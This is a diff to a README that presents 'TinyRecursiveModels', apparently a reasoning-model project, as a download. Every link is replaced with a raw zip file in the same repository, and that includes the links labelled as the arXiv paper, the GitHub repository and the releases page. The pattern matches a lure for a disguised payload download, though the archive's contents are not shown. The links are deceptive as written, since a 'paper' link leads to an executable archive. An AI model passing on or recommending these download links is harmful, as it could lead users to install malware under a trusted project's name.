@@ -1,6 +1,6 @@
 # 🧠 TinyRecursiveModels - Unlock Powerful Reasoning with Tiny Networks
 
-[![Download TinyRecursiveModels](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip)](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip)
+[![Download TinyRecursiveModels](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ Tiny Recursive Models (TRM) provides a unique approach to recursive reasoning. T
 
 To start using TinyRecursiveModels, follow these instructions:
 
-1. **Download the Software**: Visit this page to download: [TinyRecursiveModels Releases](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip).
+1. **Download the Software**: Visit this page to download: [TinyRecursiveModels Releases](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip).
    
 2. **Choose Your Package**: Look for the latest version of TinyRecursiveModels. You'll find various files available for different systems. Select the one that matches your operating system.
 
@@ -43,7 +43,7 @@ To download TinyRecursiveModels, follow these steps:
 
 1. Click on the large button below to download the application:
 
-   [![Download TinyRecursiveModels](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip)](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip)
+   [![Download TinyRecursiveModels](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)
 
 2. After the download is complete, locate the downloaded file and follow the extraction instructions as detailed above.
 
@@ -55,7 +55,7 @@ We encourage you to experiment with TRM and discover what a small model can achi
 
 Learn more about the foundation of TinyRecursiveModels:
 
-- **Research Paper**: For in-depth insights, read our [paper on arXiv](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip).
+- **Research Paper**: For in-depth insights, read our [paper on arXiv](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -80,7 +80,7 @@ Feel free to reach out through the GitHub repository for further assistance or t
 
 ## 🔗 Links
 
-- **GitHub Repository**: [TinyRecursiveModels GitHub](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip)
-- **Download Page**: [TinyRecursiveModels Releases](https://raw.githubusercontent.com/chriscowncrow/TinyRecursiveModels/main/polyopsy/TinyRecursiveModels.zip)
+- **GitHub Repository**: [TinyRecursiveModels GitHub](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)
+- **Download Page**: [TinyRecursiveModels Releases](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)
 
 Discover the power of reasoning with TinyRecursiveModels today!
